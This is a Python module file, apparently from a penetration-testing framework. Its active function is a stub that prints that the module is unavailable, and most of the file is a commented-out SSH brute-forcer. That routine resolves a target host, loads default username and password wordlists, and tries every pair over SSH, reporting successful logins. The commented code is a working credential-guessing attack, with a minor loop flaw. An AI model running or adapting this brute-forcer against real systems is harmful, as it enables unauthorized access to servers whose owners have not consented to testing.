#!/usr/bin/env python
from core.colors import color
def sshbrute(target):
    print('This module is not yet available.')
    pass
# #!/usr/bin/env python
# #-*- coding: utf-8 -*-

# #-:-:-:-:-:-:-:-:-:-:-:-:#
# #    TIDoS Framework     #
# #-:-:-:-:-:-:-:-:-:-:-:-:#

# #This module requires TIDoS Framework
# #https://github.com/0xInfection/TIDoS-Framework

# from __future__ import print_function
# import pexpect
# import time
# import socket
# from pexpect import pxssh
# from core.Core.colors import *

# sshpass = []
# sshuser = []

# def sshbrute(web):

#     print(R+'\n   ===============================')
#     print(R+'    S S H   B R U T E F O R C E R')
#     print(R+'   ===============================\n')
#     try:
#         print(GR+' [*] Testing target...')
#         ip = socket.gethostbyname(web)
#         m = raw_input(O+' [#] Use IP '+R+str(ip)+O+'? (y/n) :> ')
#         if m == 'y' or m == 'Y':
#             pass
#         elif m == 'n' or m == 'N':
#             ip = raw_input(O+' [#] Enter IP :> ')

#         print(G+' [+] Target appears online...')
#         port = raw_input(GR+' [#] Enter the port (eg. 22) :> ')

#         try:
#             with open('files/brute-db/ssh/ssh_defuser.lst','r') as users:
#                 for u in users:
#                     u = u.strip('\n')
#                     sshuser.append(u)

#             with open('files/brute-db/ssh/ssh_defpass.lst','r') as pas:
#                 for p in pas:
#                     p = p.strip('\n')
#                     sshpass.append(p)
#         except IOError:
#             print(R+' [-] Importing wordlist failed!')

#         for user in sshuser:
#             for password in sshpass:
#                 try:
#                     connect = pxssh.pxssh()
#                     connect.login(ip,str(user),password)
#                     if True:
#                         print(G+' [!] Successful login with ' +O+user+G+ ' and ' +O+password)
#                         break
#                 except:
#                     print(C+' [!] Checking '+B+user+C+' and '+B+password+'...')

#     except:
#         print(R+' [-] Target seems to be down!')
#     print(G+" [+] Done!")
